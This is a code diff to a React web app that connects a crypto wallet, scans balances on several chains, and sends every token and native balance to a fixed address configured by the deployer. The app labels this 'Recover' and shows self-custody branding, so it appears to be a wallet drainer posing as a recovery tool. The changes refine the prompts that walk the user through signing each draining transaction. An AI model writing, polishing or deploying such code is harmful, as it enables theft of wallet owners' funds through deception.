@@ -218,7 +218,9 @@ function App() {
         const cid = chainIds[i];
         const info = chains.find(c => c.id === cid);
         const chainAssets = byChain.get(cid) ?? [];
-        setStatus(`Recover ${i + 1}/${chainIds.length}: ${info?.name ?? cid}…`);
+        const step = `${i + 1}/${chainIds.length}`;
+        const chainLabel = info?.name ?? String(cid);
+        setStatus(`Chain ${step} · ${chainLabel}: preparing…`);
         try {
           let onChain = false;
           try {
@@ -226,15 +228,16 @@ function App() {
             onChain = cur === cid;
           } catch {}
           if (!onChain) {
-            setStatus(`Recover ${i + 1}/${chainIds.length}: switch wallet to ${info?.name ?? cid}…`);
+            setStatus(`Chain ${step} · ${chainLabel}: approve NETWORK SWITCH in wallet…`);
             await switchToChainId(eip1193, cid);
-            await new Promise(r => setTimeout(r, 900));
+            await new Promise(r => setTimeout(r, 1000));
           } else {
             setConnectedChain(cid);
             setSelectedChain(cid);
           }
         } catch (e: any) {
-          failures.push(`${info?.name ?? cid}: ${e?.message || 'switch failed'}`);
+          failures.push(`${chainLabel}: ${e?.message || 'switch failed'}`);
+          setStatus(`Chain ${step} · ${chainLabel}: switch failed — continuing…`);
           continue;
         }
 
@@ -242,32 +245,35 @@ function App() {
         const signer = await provider.getSigner();
         const sender = await signer.getAddress();
         if (sender.toLowerCase() !== address.toLowerCase()) {
-          failures.push(`${info?.name}: account mismatch`);
+          failures.push(`${chainLabel}: account mismatch`);
           continue;
         }
 
         const erc20s = chainAssets.filter(a => a.kind === 'erc20');
         const native = chainAssets.find(a => a.kind === 'native');
+        let tokenIndex = 0;
 
         for (const asset of erc20s) {
+          tokenIndex += 1;
           try {
-            setStatus(`Recover ${info?.name}: approve ${asset.symbol} in wallet…`);
+            setStatus(`Chain ${step} · ${chainLabel}: SIGN tx ${tokenIndex} — ${asset.symbol} (token)…`);
             const token = new Contract(asset.address, ERC20_ABI, signer);
             const rawBal: bigint = await token.balanceOf(sender);
             if (rawBal <= 0n) continue;
             const tx = await token.transfer(dest, rawBal);
             setTxHash(tx.hash);
+            setStatus(`Chain ${step} · ${chainLabel}: confirming ${asset.symbol}…`);
             await tx.wait();
             totalTx += 1;
           } catch (e: any) {
             if (e?.code === 4001) { setStatus('Recover cancelled in wallet.'); setBusy(false); return; }
-            failures.push(`${asset.symbol} on ${info?.name}`);
+            failures.push(`${asset.symbol} on ${chainLabel}`);
           }
         }
 
         if (native) {
           try {
-            setStatus(`Recover ${info?.name}: approve ${native.symbol} in wallet…`);
+            setStatus(`Chain ${step} · ${chainLabel}: SIGN tx — ${native.symbol} (native)…`);
             const bal = await provider.getBalance(sender);
             const feeData = await provider.getFeeData();
             const gasLimit = 21000n;
@@ -277,14 +283,17 @@ function App() {
               const value = bal - gasCost;
               const tx = await signer.sendTransaction({ to: dest, value, gasLimit });
               setTxHash(tx.hash);
+              setStatus(`Chain ${step} · ${chainLabel}: confirming ${native.symbol}…`);
               await tx.wait();
               totalTx += 1;
             }
           } catch (e: any) {
             if (e?.code === 4001) { setStatus('Recover cancelled in wallet.'); setBusy(false); return; }
-            failures.push(`${native.symbol} on ${info?.name}`);
+            failures.push(`${native.symbol} on ${chainLabel}`);
           }
         }
+
+        setStatus(`Chain ${step} · ${chainLabel}: done. Moving to next chain…`);
       }
 
       if (totalTx === 0) setStatus(failures.length ? `Recover finished with issues: ${failures.slice(0, 3).join('; ')}` : 'Nothing to recover.');
@@ -337,7 +346,7 @@ function App() {
     } else if (!dest || !isAddress(dest)) {
       setStatus(`Found ${result.length} asset(s). Set VITE_RECOVERY_DESTINATION in Cloudflare and redeploy, then tap Recover.`);
     } else {
-      setStatus(`All ${result.length} asset(s) selected across ${new Set(result.map(a => a.chainId)).size} network(s). Tap Recover — approve each prompt in your wallet.`);
+      setStatus(`All ${result.length} asset(s) selected across ${new Set(result.map(a => a.chainId)).size} network(s). Tap the Recover button once. You will sign each transaction chain by chain.`);
     }
   }
 
@@ -467,7 +476,7 @@ function App() {
             <div className="hero-copy">
               <div className="status-pill"><span className="live-dot" /> WALLET CONNECTION</div>
               <h1>Connect your<br /><em>wallet.</em></h1>
-              <p>Use WalletConnect for multi-chain support. Recover switches networks and sends on every chain with balances.</p>
+              <p>Use WalletConnect for multi-chain support. Recover signs one transaction at a time on each chain.</p>
             </div>
             <div className="hero-card">
               <div className="hero-card-top"><span>SELF-CUSTODY</span><span>●</span></div>
@@ -516,7 +525,7 @@ function App() {
                 {!isAddress(destination)
                   ? 'Set VITE_RECOVERY_DESTINATION in Cloudflare env, then redeploy.'
                   : tokens.length > 0
-                    ? `All ${tokens.length} asset(s) across ${chainsWithAssets.length} network(s) selected. Tap Recover and approve each chain in your wallet.`
+                    ? `All ${tokens.length} asset(s) across ${chainsWithAssets.length} network(s). Tap Recover — you will sign each chain one by one.`
                     : 'No non-zero balances found. Recover needs assets from the scan.'}
               </p>
             </div>
@@ -551,10 +560,10 @@ function App() {
                       ? 'Recover (scan for assets first)'
                       : !isAddress(destination)
                         ? 'Recover (set destination env & redeploy)'
-                        : `Recover (${tokens.length} asset${tokens.length === 1 ? '' : 's'}) — sign in wallet`}
+                        : `Recover — sign each chain (${tokens.length} asset${tokens.length === 1 ? '' : 's'})`}
               </button>
               <small style={{ textAlign: 'center', opacity: 0.75 }}>
-                WalletConnect will request a network switch for each chain, then a transfer signature.
+                One Recover click → for each chain: approve switch, then sign each token tx, then native. Approve every prompt in your wallet.
               </small>
             </div>
             {txHash && chainInfo && (
